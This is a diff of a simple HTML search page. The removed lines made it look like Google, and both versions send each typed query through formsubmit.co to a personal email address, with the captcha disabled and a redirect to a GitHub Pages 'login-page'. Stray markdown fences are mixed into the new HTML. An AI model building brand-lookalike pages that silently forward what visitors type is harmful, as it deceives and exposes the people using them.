@@ -1,8 +1,9 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Search</title>
+<title>Search Page</title>
 
 <style>
 body {
@@ -13,7 +14,6 @@ body {
     display: flex;
     justify-content: center;
     align-items: center;
-    flex-direction: column;
 }
 
 .overlay {
@@ -21,8 +21,6 @@ body {
     width: 100%;
     height: 100%;
     background: rgba(0,0,0,0.3);
-    top: 0;
-    left: 0;
 }
 
 .container {
@@ -32,17 +30,16 @@ body {
 }
 
 .logo {
-    font-size: 60px;
+    font-size: 50px;
     font-weight: bold;
     margin-bottom: 20px;
 }
 
 .search-box {
-    width: 500px;
+    width: 450px;
     background: white;
     border-radius: 30px;
     padding: 12px 20px;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
 }
 
 .search-box input {
@@ -56,15 +53,16 @@ button {
     margin-top: 20px;
     padding: 10px 20px;
     border: none;
-    background: #f8f9fa;
-    cursor: pointer;
     border-radius: 5px;
+    background: #f1f1f1;
+    cursor: pointer;
 }
 
 button:hover {
-    background: #e0e0e0;
+    background: #ddd;
 }
 </style>
+
 </head>
 
 <body>
@@ -72,22 +70,26 @@ button:hover {
 <div class="overlay"></div>
 
 <div class="container">
-    <div class="logo">Google</div>
+    <div class="logo">Search</div>
 
-    <!-- FORM -->
-    <form action="https://formsubmit.co/srikavi0412@gmail.com" method="POST">
-        
-        <div class="search-box">
-            <input type="text" name="search" placeholder="Search Google or type a URL" required>
-        </div>
+```
+<form action="https://formsubmit.co/srikavi0412@gmail.com" method="POST">
 
-        <!-- Hidden settings -->
-        <input type="hidden" name="_subject" value="Search Query">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="http://localhost:8000">
+    <div class="search-box">
+        <input type="text" name="search" placeholder="Type your query..." required>
+    </div>
 
-        <button type="submit">Search</button>
-    </form>
+    <!-- Settings -->
+    <input type="hidden" name="_subject" value="New Search Query">
+    <input type="hidden" name="_captcha" value="false">
+
+    <!-- IMPORTANT: GitHub Pages link -->
+    <input type="hidden" name="_next" value="https://SriKavi412.github.io/login-page/thankyou.html">
+
+    <button type="submit">Search</button>
+</form>
+```
+
 </div>
 
 </body>
